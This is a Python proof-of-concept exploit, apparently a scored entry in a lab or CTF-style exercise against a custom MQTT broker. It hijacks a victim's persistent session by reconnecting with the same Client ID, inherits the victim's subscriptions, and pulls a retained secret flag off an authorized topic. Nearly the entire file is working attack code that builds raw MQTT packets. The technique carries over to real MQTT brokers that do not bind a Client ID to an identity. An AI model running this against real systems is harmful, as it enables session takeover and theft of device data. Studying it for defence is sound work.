#!/usr/bin/env python3
"""
PoC #4: Client-ID collision session hijack
----------------------------------------------
Location: Broker._handle_connect() in mqb/broker.py. Per the MQTT 3.1.1 spec
(MQTT-3.1.4-2), a new CONNECT with an already-connected Client Identifier
must disconnect the existing connection -- and this broker implements
exactly that, and nothing else: no check that the new TCP connection is the
same physical device, no re-authentication tied to the original session. For
a persistent session (clean_session=0), the new connection also silently
inherits the old connection's subscriptions (`inherited_subs` in
_handle_connect()).

Scored outcome: the victim here is modeled as a fleet-relay client that
legitimately subscribes to the seeded flag topic (MQB_FLAG_TOPIC, default
"fleet/control/flag") that PoC #2 and #3 target -- carrying the real
per-deployment secret MQB_FLAG, planted by the broker itself at startup (see
Broker.seed_startup_state() in mqb/broker.py). An attacker who knows/guesses
the victim's Client ID takes over its session (inheriting its subscription)
and, now holding the victim's authenticated, authorized identity, pulls the
retained secret straight off that channel -- recovering the actual MQB_FLAG.
That is the scored impact, and it is what makes #4 distinct from #2: PoC #2 is
a *stranger* subscribing to a wildcard with no ACL, so the fix for #2 is a
per-client ACL that denies strangers the flag topic; #4 defeats exactly that
fix, because the attacker is not a stranger -- it has become the victim, whose
subscription to `fleet/control/flag` is authorized. Retained delivery happens
on SUBSCRIBE (MQTT 3.1.2.4), not on silent session-inherit, so the takeover
connection issues that subscribe as the hijacked identity to draw the secret.

Note on scope: taking over the Client ID also knocks the one victim
connection offline (proven below), but per this repo's scoring contract (root
README, "Vulnerability requirements") a DoS only counts if it costs the
*shared* service, not one caller's own connection -- so that disconnect is
reported purely as proof the takeover mechanism fired, not as a second
scoreable impact. The scored claim is recovery of the real MQB_FLAG.

Run: python3 04_client_id_collision_hijack.py [host] [port]
"""
import os
import re
import socket
import struct
import sys
import time
import uuid

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1883
PASSWORD = os.environ.get("MQB_REQUIREPASS")
FLAG_TOPIC = os.environ.get("MQB_FLAG_TOPIC", "fleet/control/flag")
# The real seeded secret is a FLAG{...}; only the broker ever puts it on the
# wire, so recovering any value of this shape off the channel is recovering the
# genuine per-deployment MQB_FLAG (same assertion PoC #2 uses).
FLAG_RE = re.compile(rb"FLAG\{[^}]*\}")


def _u8(s):
    b = s.encode()
    return struct.pack("!H", len(b)) + b


def _rl(n):
    out = bytearray()
    while True:
        b = n % 128
        n //= 128
        if n > 0:
            b |= 0x80
        out.append(b)
        if n == 0:
            break
    return bytes(out)


def build_connect(client_id, clean_session=1, keep_alive=30, password=None):
    flags = (clean_session & 1) << 1
    if password is not None:
        flags |= 0x40
    body = _u8("MQTT") + bytes([4, flags]) + struct.pack("!H", keep_alive) + _u8(client_id)
    if password is not None:
        pb = password.encode() if isinstance(password, str) else password
        body += struct.pack("!H", len(pb)) + pb
    return bytes([0x10]) + _rl(len(body)) + body


def build_publish(topic, payload, qos=0, retain=0, packet_id=1):
    flags = (qos & 3) << 1 | (retain & 1)
    body = _u8(topic)
    if qos > 0:
        body += struct.pack("!H", packet_id)
    body += payload
    return bytes([0x30 | flags]) + _rl(len(body)) + body


def build_subscribe(filters, packet_id=1):
    body = struct.pack("!H", packet_id)
    for f, q in filters:
        body += _u8(f) + bytes([q])
    return bytes([0x82]) + _rl(len(body)) + body


def recv_packet(sock, timeout=5.0):
    sock.settimeout(timeout)
    try:
        first = sock.recv(1)
        if not first:
            return None
        ptype = first[0] >> 4
        mult, val = 1, 0
        while True:
            b = sock.recv(1)[0]
            val += (b & 0x7F) * mult
            if not (b & 0x80):
                break
            mult *= 128
        body = b""
        while len(body) < val:
            chunk = sock.recv(val - len(body))
            if not chunk:
                break
            body += chunk
        return ptype, body
    except socket.timeout:
        # No packet within the window -> report absence, not a crash. Callers
        # treat None as "nothing arrived"; letting a bare socket.timeout escape
        # here made the whole PoC exit non-cleanly and be scored could-not-run.
        return None


def _wait_for_server(timeout=15.0):
    """Wait for the broker's MQTT port to accept connections. Guards against
    the PoC racing the container's startup when invoked directly via
    `docker compose run --rm poc python3 NN_slug.py <host> <port>`."""
    deadline = time.time() + timeout
    last_err = None
    while time.time() < deadline:
        try:
            s = socket.create_connection((HOST, PORT), timeout=2)
            s.close()
            return
        except OSError as e:
            last_err = e
            time.sleep(0.3)
    raise RuntimeError(f"server never came up on {HOST}:{PORT}: {last_err}")


def main():
    _wait_for_server()

    token = uuid.uuid4().hex[:12]
    victim_client_id = f"fleet-relay-{token}"  # the ID an attacker knows/guesses

    # 1. Victim connects with a persistent session and subscribes to the
    #    seeded flag topic, exactly as a legitimate fleet-relay client would.
    victim = socket.create_connection((HOST, PORT), timeout=10)
    victim.sendall(build_connect(victim_client_id, clean_session=0, password=PASSWORD))
    recv_packet(victim)  # CONNACK
    victim.sendall(build_subscribe([(FLAG_TOPIC, 0)]))
    recv_packet(victim)  # SUBACK
    recv_packet(victim, timeout=2.0)  # drains the immediate retained-flag delivery, if any

    # 2. Attacker connects with the SAME Client ID. No credentials tie this
    #    connection to the victim's device in any way.
    attacker = socket.create_connection((HOST, PORT), timeout=10)
    attacker.sendall(build_connect(victim_client_id, clean_session=0, password=PASSWORD))
    pkt = recv_packet(attacker)
    session_present = pkt is not None and pkt[0] == 2 and len(pkt[1]) >= 1 and pkt[1][0] == 1

    # Proof the takeover mechanism actually fired: the victim's original
    # connection gets forcibly closed by the broker. Reported for mechanism
    # verification only -- see docstring above on why this alone isn't
    # claimed as the scored impact.
    victim.settimeout(3.0)
    try:
        leftover = victim.recv(16)
        victim_kicked = leftover == b""
    except (socket.timeout, ConnectionResetError, OSError):
        victim_kicked = True

    # 3. A third party (standing in for the real fleet controller) publishes
    #    a live update on the flag topic -- the same channel the seeded
    #    secret rides on.
    third_party = socket.create_connection((HOST, PORT), timeout=10)
    third_party.sendall(build_connect(f"poc4-thirdparty-{token}", password=PASSWORD))
    recv_packet(third_party)  # CONNACK
    marker = f"flag-topic-update-{token}".encode()
    third_party.sendall(build_publish(FLAG_TOPIC, marker, qos=0))
    third_party.close()

    # 4. The attacker connection -- which itself never subscribed to
    #    anything -- receives that live update if it inherited the victim's
    #    subscription to the real secret channel (mechanism color: proves the
    #    inheritance, distinct from a fresh connection).
    time.sleep(0.3)
    pkt = recv_packet(attacker, timeout=3.0)
    inherited_delivery = pkt is not None and pkt[0] == 3 and marker in pkt[1]

    # 5. SCORED: as the hijacked (authorized) identity, pull the retained
    #    secret off the channel. Retained messages are (re)delivered on
    #    SUBSCRIBE, not on silent session-inherit, so the takeover connection
    #    subscribes to the exact flag topic -- something a per-client ACL (the
    #    fix for #2) would deny a stranger but not the impersonated victim --
    #    and the broker hands over the real seeded MQB_FLAG.
    attacker.sendall(build_subscribe([(FLAG_TOPIC, 0)], packet_id=2))
    stolen_flag = None
    deadline = time.time() + 4
    while time.time() < deadline and stolen_flag is None:
        pkt = recv_packet(attacker, timeout=3.0)
        if pkt is None:
            break
        ptype, body = pkt
        if ptype == 3:  # PUBLISH
            m = FLAG_RE.search(body)
            if m:
                stolen_flag = m.group(0)

    victim.close()
    attacker.close()

    print(f"[*] CONNACK session-present flag on attacker's takeover CONNECT: {session_present}")
    print(f"[*] victim's original connection was disconnected by the broker "
          f"(mechanism proof only, not claimed as scoreable DoS): {victim_kicked}")
    print(f"[*] attacker (never itself subscribed) received a live update on the seeded "
          f"flag topic {FLAG_TOPIC!r} via the inherited subscription: {inherited_delivery}")
    print(f"[*] real seeded secret pulled off {FLAG_TOPIC!r} as the hijacked identity: "
          f"{stolen_flag.decode() if stolen_flag else None!r}")

    if session_present and victim_kicked and stolen_flag:
        print("[+] SCORED: connecting with the victim's Client ID hijacked its session with "
              "no identity check, and -- as the now-authorized victim -- pulled the real "
              f"per-deployment secret ({stolen_flag.decode()}) off {FLAG_TOPIC!r}, defeating "
              "any per-client ACL that would stop an unrelated subscriber")
        return 0
    print("[-] Could not confirm session hijack + secret recovery")
    return 1


if __name__ == "__main__":
    sys.exit(main())
